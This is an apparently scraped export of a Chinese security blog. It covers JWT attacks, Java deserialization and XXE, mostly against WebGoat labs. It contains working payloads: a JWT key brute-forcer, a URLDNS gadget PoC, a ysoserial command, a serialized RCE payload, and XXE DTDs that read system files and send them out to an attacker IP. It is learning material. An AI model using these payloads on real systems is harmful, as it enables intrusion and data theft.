Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken); Claims claims = (Claims) jwt.getBody(); String user = (String) claims.get(&quot;user&quot;); boolean isAdmin = Boolean.valueOf((String) claims.get(&quot;admin&quot;)); if (isAdmin) &#123; removeAllUsers(); &#125; else &#123; log.error(&quot;You are not an admin user&quot;); &#125;&#125; catch (JwtException e) &#123; throw new InvalidTokenException(e);&#125; 1234try &#123; Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken); Claims claims = (Claims) jwt.getBody();... 就是第2行代码不一样。主要涉及两个函数： parseClaimsJws： parse refresh token——生成 看到代码存在两个POSTMAPPING： 12@PostMapping(&#123;&quot;/JWT/refresh/checkout&quot;&#125;)@PostMapping(&#123;&quot;/JWT/refresh/newToken&quot;&#125;) 第一个是确认订单的，主要看第二个生成refresh token： 12345678910111213141516171819202122232425262728293031323334353637383940414243@PostMapping( value = &#123;&quot;/JWT/refresh/login&quot;&#125;, consumes = &#123;&quot;application/json&quot;&#125;, produces = &#123;&quot;application/json&quot;&#125;)@ResponseBodypublic ResponseEntity follow(@RequestBody(required = false) Map&lt;String, Object&gt; json) &#123; if (json == null) &#123; return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build(); &#125; else &#123; String user = (String)json.get(&quot;user&quot;); String password = (String)json.get(&quot;password&quot;); return &quot;Jerry&quot;.equalsIgnoreCase(user) &amp;&amp; &quot;bm5nhSkxCXZkKRy4&quot;.equals(password) ? ResponseEntity.ok(this.createNewTokens(user)) : ResponseEntity.status(HttpStatus.UNAUTHORIZED).build(); &#125;&#125;public ResponseEntity newToken(@RequestHeader(value = &quot;Authorization&quot;,required = false) String token, @RequestBody(required = false) Map&lt;String, Object&gt; json) &#123; if (token != null &amp;&amp; json != null) &#123; String user; String refreshToken; try &#123; Jwt&lt;Header, Claims&gt; jwt = Jwts.parser().setSigningKey(&quot;bm5n3SkxCX4kKRy4&quot;).parse(token.replace(&quot;Bearer &quot;, &quot;&quot;)); user = (String)((Claims)jwt.getBody()).get(&quot;user&quot;); refreshToken = (String)json.get(&quot;refresh_token&quot;); &#125; catch (ExpiredJwtException var6) &#123; user = (String)var6.getClaims().get(&quot;user&quot;); refreshToken = (String)json.get(&quot;refresh_token&quot;); &#125; if (user != null &amp;&amp; refreshToken != null) &#123; if (validRefreshTokens.contains(refreshToken)) &#123; validRefreshTokens.remove(refreshToken); return ResponseEntity.ok(this.createNewTokens(user)); &#125; else &#123; return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build(); &#125; &#125; else &#123; return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build(); &#125; &#125; else &#123; return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build(); &#125; &#125; 从上面可以看到，我们需要的Username为Jerry，密码是静态的。那么根据responsebody，我们构造请求包，这里知道是json格式：通过checkout的请求包，将conten-type改为json，然后构造参数，即可获得refresh token。 在/JWT/refresh/newToken接口，首先接收Authorization的值，进行jwt解码，得到user，然后再从json中得到refresh_token，如果refresh_token有效，则刷新access_token。 密钥爆破攻击 相对于上面，如果我们有密钥，那么我们就可以跟着修改签名，重新构造数据包进行攻击。我们可以发起离线的暴力破解发起对密钥的攻击。字典的话需要自己找。具体流程如下： 抓取到JWT token，分析得到如下： 将token放到破解脚本里面 123456789101112131415161718192021import jwtimport jsonalg = &quot;HS256&quot;jwt_str = &quot;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY4NjE4NzUwOCwiZXhwIjoxNjg2MTg3NTY4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.0TkftJKgV9kqnroqC_5QhsJdkxhl7x65m4ZPSA8Qq4M&quot;with open(&#x27;pass.txt&#x27;, encoding=&#x27;utf-8&#x27;) as f: for line in f: key_ = line.strip() try: jwt.decode(jwt_str, verify=True, key=key_, algorithms=&quot;HS256&quot;) print(&#x27;found key! --&gt; &#x27; + key_) break except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError): print(&#x27;found key! --&gt; &#x27; + key_) break except jwt.exceptions.InvalidSignatureError: continue else: print(&quot;key not found!&quot;) 找个好一点的字典直接开干 破解到之后，大概率token已经过期了，所以重新生成（但是密钥应该不会变），重新构造，例如得到密钥：shipping 综合利用 与sql注入结合 JWT由这个组成，看到kid不是自带的固定字段，所以可能有设么含义： 然后看到源代码： 123ResultSet rs = connection.createStatement().executeQuery(&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot; + kid + &quot;&#x27;&quot;);...var6 = TextCodec.BASE64.decode(rs.getString(1)); 从Header中获取“kid”直接插入sql查询语句中，存在SQL注入，将返回结果进行了base64解码作为KEY，然后进行解析。然后解析后 ，username参数等于”Tom”，则删除。 参考：https://www.cnblogs.com/yokan/p/15202333.html Node.js前端jw登录安全，伪造admin 注册用户登录，分析：controllers/api.js，看到需要我们伪造用户：admin 抓取数据包，进行解密修改后再加密，伪造登录即可 安全使用 使用 JWT 时的一些最佳实践： 固定算法，不允许客户端切换算法。 使用对称密钥对令牌进行签名时，请确保使用适当的密钥长度。 确保添加到令牌的声明不包含个人信息。如果您需要添加更多信息，也可以选择加密令牌。 向您的项目添加足够的测试用例以验证无效令牌实际上不起作用。与第三方集成以检查您的令牌并不意味着您根本没有测试您的应用程序。","categories":[{"name":"JAVA安全基础","slug":"JAVA安全基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"渗透测试基础","slug":"JAVA安全基础/渗透测试基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"JWT","slug":"JWT","permalink":"https://j3f5.github.io/tags/JWT/"}]},{"title":"反序列化漏洞基础","slug":"反序列化漏洞基础","date":"2023-06-07T03:39:32.000Z","updated":"2023-06-07T03:39:32.000Z","comments":true,"path":"articles/2023/06/07/反序列化漏洞基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/","excerpt":"","text":"JAVA反序列化 概念 序列化与反序列化 Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。 Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。 序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。 例子： 最常见的反序列化情况便是服务器的SESSION，当有大量用户并发访问，就有可能出现庞大数量的SESSION 对象，内存显然不够用，于是Web 容器便会将SESSION 先序列化到硬盘中，等需要使用时，再将保存在硬盘中的对象还原到内存中，这个存储再拿出来的过程便是序列化和反序列化的过程。 漏洞成因与危害 成因：Java 程序没有对反序列化生成的对象的类型做限制。在 Java 中反序列化漏洞之所以比较严重的原因之一是：Java 存在大量的公用库，例如Apache Commons Collections。而这其中实现的一些类可以被反序列化用来实现任意代码执行。WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 这些应用的反序列化漏洞能够得以利用，便是依靠了Apache Commons Collections。当然反序列漏洞的根源并不在于公共库，他只是手段与途径。 危害：任意代码执行，获取SHELL，对服务器进行破坏。 涉及函数 ObjectOutputStream 类 writeObject() 方法可以对参数指定的obj 对象进行序列化操作，并将得到的字节序列写到目标输出流中。 ObjectInputStream 类 ReadObject()方法则是从源输入流中读取字节序列，再将其反序列化为对象并返回。 可以序列化反序列化的类都需要声明接口Serializable 漏洞利用的条件 存在利用链 在程序中，通过方法调用、对象传递和反射机制等手段作为跳板，攻击者能构造出一个产生安全问题的利用链，如任意文件读取或写入、远程代码执行等漏洞。利用链又称作Gadget chain，利用链的构造往往由多个类对象组成，环环相扣就像一个链条。 存在触发点 程序中仅有一条利用链或者仅有一个反序列化的触发点都不会造成安全问题，不能被认定为漏洞。需要存在入口以及触发漏洞的函数。 序列化字符串 下方的特征可以作为序列化的标志参考： 一段以rO0AB开头，基本可以确认是JAVA序列化字符串以base64加密的数据。 序列化+base64 一段以aced开头，基本就是JAVA序列化的16进制数据 测试用例（WebGoat与ysoserial） 基础反序列化 著名含反序列化漏洞的代码： 123InputStream is = request.getInputStream();ObjectInputStream ois = new ObjectInputStream(is);AcmeObject acme = (AcmeObject)ois.readObject(); 它期待着一个AcmeObject对象，但它会在铸造发生之前执行readObject()。如果攻击者找到了在readObject()中实现危险操作的适当的类，他可以将该对象序列化，并强迫受攻击的应用程序执行这些操作。攻击者需要在classpath中找到一个支持序列化并在readObject()上有危险实现的类。【也就是利用链】 12345678910111213141516171819202122232425262728293031package org.dummy.insecure.framework;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.io.ObjectInputStream;import java.io.Serializable;import java.time.LocalDateTime;public class VulnerableTaskHolder implements Serializable &#123; private static final long serialVersionUID = 1; private String taskName; private String taskAction; private LocalDateTime requestedExecutionTime; public VulnerableTaskHolder(String taskName, String taskAction) &#123; super(); this.taskName = taskName; this.taskAction = taskAction; this.requestedExecutionTime = LocalDateTime.now(); &#125; private void readObject( ObjectInputStream stream ) throws Exception &#123; //deserialize data so taskName and taskAction are available stream.defaultReadObject(); //blindly run some code. #code injection Runtime.getRuntime().exec(taskAction); &#125;&#125; 如果上图所示的java类存在，攻击者可以将该对象序列化并获得远程代码执行。利用链如下：用户定义了一个VulnerableTaskHolder对象Go，然后传入对应的参数值，对我们构造的恶意对象进行序列化，将会出发Runtime.getRuntime().exec(taskAction);。 1234567VulnerableTaskHolder go = new VulnerableTaskHolder(&quot;delete all&quot;, &quot;rm -rf somefile&quot;);ByteArrayOutputStream bos = new ByteArrayOutputStream();ObjectOutputStream oos = new ObjectOutputStream(bos);oos.writeObject(go);oos.flush();byte[] exploit = bos.toByteArray(); ysoserial样例分析（URLDNS样例） 这个是https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java的一个项目，按照别人的payload来学习某个模块是否存在反序列化漏洞。 主要代码如下： 12345678public Object getObject(String url) throws Exception &#123; URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); URL u = new URL((URL)null, url, handler); ht.put(u, url); Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); return ht;&#125; 这里面涉及几个类，一个是URL一个是HashMap。先循序渐进，看类与方法。怎么看类？找readObject和writeObject类看到两个个类，HashMap有readObject方法。 看到一个方法put，那就ctrl+b进去 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; 这里有两个函数，一个putVal，一个是hash，现在进去putVal 12345678 final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length;.... return null; &#125; 没啥，涉及到的函数都是与树相关的操作，就是存储吧，所以返回hash方法，这个方法传入的是key的 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; key是URL的，所以去到URL类看看hashCode 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; 需要hashCode==-1才能执行后面的hashCode函数，跟进hashcode函数 1234567891011121314151617protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) &#123; h += addr.hashCode(); &#125; else &#123; String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); &#125; 发现InetAddress addr = getHostAddress(u)可以获取URL的IP地址就是域名解析。 我其实跑偏了：正确是先找readObject。 当我们传入序列化的数据时，因为HashMap有readObject函数，所以跟进一下： 12345678910111213141516 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize();....... // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125; &#125; 发现putVal(hash(key), key, value, false, false);这个，上面已经分析过。所以 所以利用链就是： 存在URL和Hashmap Hashmap重写了readObject方法，里面，使用putVal函数的时候会调用hash函数对URL进行hashCode处理 URL的hashcode函数调用getHostAddress进行域名解析 所以现在模仿写一个： 12345678910111213141516171819202122232425262728293031323334353637383940package com.urldns;import java.io.*;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class URLDNS &#123; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123; /* ERROR 1. Unable to make field private int java.net.URL.hashCode accessible: module java.base does not &quot;opens -- Java version is too high 2. has been compiled by a more recent version of the Java Runtime (class file version 52.0) -- Java version is too high. Please reset the project structure and the configuration */ String sUrl = &quot;http://ib7pmo.dnslog.cn&quot;; URL uUrl = new URL(sUrl); HashMap hashMap = new HashMap(); // 这里获取URL类的字段，这里列举两种方法 Field field = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); // Field field = uUrl.getClass().getDeclaredField(&quot;hashCode&quot;); // 因为是私有方法，所以这里设置能更改 field.setAccessible(true); // 为了不混淆，这里put方法也可以造成dnslog的，所以设置2 field.set(uUrl, 2); hashMap.put(uUrl, &quot;J3ff&quot;); // 存起来了，后面就可以用了 field.set(uUrl, -1); // 开始序列化 ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;urldns.exp&quot;)); objectOutputStream.writeObject(hashMap); // 反序列化 ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;urldns.exp&quot;)); objectInputStream.readObject(); &#125;&#125; webgoat 反序列化漏洞分析 and ysoserial的使用 现在查到这个有漏洞的类代码为： 1234567891011121314151617181920212223public class InsecureDeserializationTask extends AssignmentEndpoint &#123; public InsecureDeserializationTask() &#123; &#125; @PostMapping(&#123;&quot;/InsecureDeserialization/task&quot;&#125;) @ResponseBody public AttackResult completed(@RequestParam String token) throws IOException &#123; // 对接收到的token进行了一波敏感字符替换变成b64token String b64token = token.replace(&#x27;-&#x27;, &#x27;+&#x27;).replace(&#x27;_&#x27;, &#x27;/&#x27;); long before;long after; try &#123; label71: &#123; // 对b64token解码过后进行了readObject()反序列化操作（第16行） ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token))); // ... before = System.currentTimeMillis(); Object o = ois.readObject(); // 看这个对象是不是VulnerableTaskHolder的实例 if (!(o instanceof VulnerableTaskHolder)) &#123; // ... after = System.currentTimeMillis(); // ... // 看执行了多久，时间长了就算成功 int delay = (int)(after - before); // ... 就如上面代码所示，我们应该看VulnerableTaskHolder类，里面的readObject()反序列化操作到底有什么可以利用的。 123456789101112131415161718192021222324252627282930313233343536373839public class VulnerableTaskHolder implements Serializable &#123; private static final long serialVersionUID = 2; private String taskName; private String taskAction; private LocalDateTime requestedExecutionTime; public VulnerableTaskHolder(String taskName, String taskAction) &#123; super(); this.taskName = taskName; this.taskAction = taskAction; this.requestedExecutionTime = LocalDateTime.now(); &#125; @Override public String toString() &#123; return &quot;VulnerableTaskHolder [taskName=&quot; + taskName + &quot;, taskAction=&quot; + taskAction + &quot;, requestedExecutionTime=&quot; + requestedExecutionTime + &quot;]&quot;; &#125; // 执行反序列化操作 private void readObject(ObjectInputStream stream) throws Exception &#123; // 反序列化中的taskName和taskAction属性都是可以利用的 stream.defaultReadObject(); // 对数据进行操作的记录 ... // 对象误操作 ... // 注释：这里的条件是为了防止你把山羊完全毁掉 if ((taskAction.startsWith(&quot;sleep&quot;) || taskAction.startsWith(&quot;ping&quot;)) &amp;&amp; taskAction.length() &lt; 22) &#123; log.info(&quot;about to execute: &#123;&#125;&quot;, taskAction); try &#123; // 执行Runtime.getRuntime().exec(taskAction); 所以把攻击的恶意代码写到 taskAction 类中 Process p = Runtime.getRuntime().exec(taskAction); BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream())); String line = null; while ((line = in.readLine()) != null) &#123; log.info(line); &#125; &#125; catch (IOException e) &#123; log.error(&quot;IO Exception&quot;, e);&#125;&#125;&#125;&#125; 执行Runtime.getRuntime().exec(taskAction); 所以把攻击的恶意代码写到 taskAction 类中，所以构造payload的java文件（目录为src文件夹中，org.dummy.insecure.framework文件夹下的Main文件）： 1234567891011121314package org.dummy.insecure.framework;import java.io.*;import java.util.Base64;public class Main &#123; public static void main(String[] args) throws IOException&#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); VulnerableTaskHolder vulnerableTaskHolder = new VulnerableTaskHolder(&quot;ping&quot;, &quot;ping -n 6 127.0.0.1&quot;); ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(vulnerableTaskHolder); String str = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); System.out.println(str); outputStream.close(); &#125;&#125; 然后把VulnerableTaskHolder.java也弄到这里去：目录为src文件夹中，org.dummy.insecure.framework文件夹下，注意删掉错误的部分。运行即可。 1rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAfnBgYRFBgzn0lIeHQAE3BpbmcgLW4gNiAxMjcuMC4wLjF0AARwaW5n 所以我们要构造的恶意代码应该遵循：恶意命令→序列化→base64→rO0AB格式字符串【最终Payload】 当然，我们可以使用DNSlog测试：VulnerableTaskHolder vuln = new VulnerableTaskHolder(&quot;qwq&quot;,&quot;ping ***.dnslog.cn&quot;); 这个恶意命令一般是反弹shell，因为考虑到有的不回显。 ysoserial 可以看到里面有很多组件，选择其中的一个，然后通过他给出的指令： 1Usage: java -jar ysoserial-[version]-all.jar [payload] &#x27;[command]&#x27; 我们找到需要的组件，然后生成即可： 1java -jar .\\ysoserial.jar Hibernate1 calc.exe &gt; payload.bin PHP反序列化 PHP反序列化不是本章的重点，所以浅浅说一下，这里面的序列化结构如下： 具体可以参考如下导图做简单的复习： 参考： https://xz.aliyun.com/t/12507#toc-11","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://j3f5.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"DNSlog数据外带在各种攻击的利用方式（无回显）","slug":"DNSlog数据外带在各种攻击的利用方式（无回显）","date":"2023-06-06T02:09:43.000Z","updated":"2023-06-06T02:09:43.000Z","comments":true,"path":"articles/2023/06/06/DNSlog数据外带在各种攻击的利用方式（无回显）/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/06/DNSlog%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6%E5%9C%A8%E5%90%84%E7%A7%8D%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89/","excerpt":"","text":"gegege~ 暂时鸽了","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"XSS","slug":"XSS","permalink":"https://j3f5.github.io/tags/XSS/"},{"name":"RCE","slug":"RCE","permalink":"https://j3f5.github.io/tags/RCE/"},{"name":"XXE","slug":"XXE","permalink":"https://j3f5.github.io/tags/XXE/"}]},{"title":"XXE与XML的利用与绕过","slug":"XXE与XML的利用与绕过","date":"2023-06-05T13:48:11.000Z","updated":"2023-06-05T13:48:11.000Z","comments":true,"path":"articles/2023/06/05/XXE与XML的利用与绕过/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/05/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/","excerpt":"","text":"基础知识 XML XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明 DTD 文档类型定义（可选） 文档元素 其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。 XXE XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。 XML 与 HTML 的主要差异 XML 被设计为传输和存储数据，其焦点是数据的内容。 HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息 ，而 XML 旨在传输信息。 XML文档格式 其中DOCTYPE是DTD的声明；ENTITY是DDT实体的声明，所谓实体可以理解为变量。SYSTEM、PUBLIC是外部资源的申请。看到SYSTEM后面的文件是可以指向文件的，如果可以被我们控制，那么我们就可以读取服务器文件信息，或者远程文件。 123456789101112131415161718&lt;!--XML 声明--&gt;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义 note 元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义 to 元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!-- 定义 from 元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!-- 定义 head 元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!-- 定义 body 元素为”#PCDATA”类型--&gt;&lt;!ENTITY xxe &quot;test&quot;&gt; &lt;!-- 外部实体 --&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt; DTD声明 文档类型定义（DTD）可定义合法的 XML 文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用 1234&lt;!-- 内部的 DOCTYPE 声明 --&gt;&lt;!DOCTYPE 根元素 [元素声明]&gt;&lt;!-- 外部文档声明 --&gt;&lt;!DOCTYPE 根元素 SYSTEM ”文件名”&gt; DTD 实体 内部实体 略 外部实体（通用实体） 外部实体表示外部文件的内容，用 SYSTEM 关键词表示，通常使用 &lt;!DOCTYPE 根元素 SYSTEM “文件名&quot;&gt; &lt;!DOCTYPE 根元素 PUBLIC “public_ID&quot; “文件名&quot;&gt; 的形式引用外部实体。 参数实体 使用 % 实体名（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用 只有在DTD文件中，参数实体的声明才能引用其他实体 和通用实体一样，参数实体也可以外部引用 123&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;%an-element;%remote-dtd; 举例子（java） 1234567891011121314151617181920&lt;!-- 内部实体声明 --&gt;&lt;!ENTITY 实体名称 ”实体的值”&gt;&lt;!-- 外部实体声明 --&gt;&lt;!ENTITY 实体名称 SYSTEM ”URI”&gt;&lt;!-- 参数实体声明 --&gt;&lt;!ENTITY %实体名称 ”实体的值”&gt;&lt;!ENTITY %实体名称 SYSTEM ”URI”&gt;&lt;!-- 举例内部实体 --&gt;&lt;!ENTITY xxe &quot;test&quot;&gt; &lt;!-- 举例外部实体 --&gt;&lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1/kk.php&quot;&gt; &lt;!-- 举例内部实体 --&gt;&lt;!ENTITY xxe &quot;test&quot;&gt; &lt;!-- 引用实体 --&gt;&lt;credit&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/credit&gt; 用图解释一下： 而JAVA是怎么把它变成对象的呢？在Java应用程序中，XML可以用来从客户端获取数据到服务器，我们都熟悉JSON apis，我们也可以用xml来获取信息。大多数情况下，框架会根据xml结构自动填充Java对象，例如： 注入攻击 XML注入攻击（内部实体攻击） 为什么要提XML注入呢，我们从XXE的全称（XML外部实体注入）可以看出，XXE也是一种XML注入，只不过注入的是XML外部实体罢了，所以看一下。看到，就是插入了一个数据，跟sql啥的一般无二，但是得注意标头是怎么样的，实际上没什么用。 服务器解析xml的php代码： 12345678&lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); echo $creds;?&gt; 其中libxml_disable_entity_loader（BOOL）函数接收true或false两种布尔型参数，用来表示是否允许禁用外部加载实体，当值为false时允许加载外部实体；通过file_get_contents()加载传入的参数，再通过DOMDocument类中的loadXML函数加载外部传入的实体（XML），最后将结果返回显示。 XXE 因此我们构造一个XML外部实体，用来访问服务器上的敏感文件，然后再数据传输过程中将自己的实体注入。 读文件 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;file:///C:/windows/system.ini&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 绕过 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 通过各种协议绕过 内网探针或攻击内网应用（难利用） 实际应用中基本碰不到（触发漏洞地址），因为有前提条件： 内网IP地址 开放端口 存在xxe漏洞 构造漏洞地址 RCE（难利用） 该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令 实际应用中很难碰到 12345&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 引入外部实体 dtd 条件： 观察是否禁止外部实体引入（有点像本地包含与远程包含） 引入外部实体的原因： 自定义攻击代码 绕过恶意代码检测 代码： 123456&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:80/evil2.dtd&quot;&gt;%file;]&gt;&lt;x&gt;&amp;send;&lt;/x&gt; evil2.dtd: 1&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt; 无回显读文件 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:80/evil2.dtd&quot;&gt;%dtd;%send;]&gt; evil2.dtd 1234&lt;!ENTITY % payload&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://127.0.0.1:80/?data=%file;&#x27;&gt;&quot;&gt;%payload; 无回显读文件——外带数据（可dnslog） 操作： 服务器处理XML源代码 123456&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);?&gt; payload 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM &quot;http://my.local.cn/test.dtd&quot;&gt;%remote;%int;%send;]&gt; 再提交数据的时候引用另一个DTD文件，test.dtd将服务器上的敏感文件进行base64编码后转发给攻击者ip：9999端口上 test.dtd （来自你的恶意dtd，在你的服务器里面） 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/windows/system.ini&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.210.37:9999?p=%file;&#x27;&gt;&quot;&gt; 我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 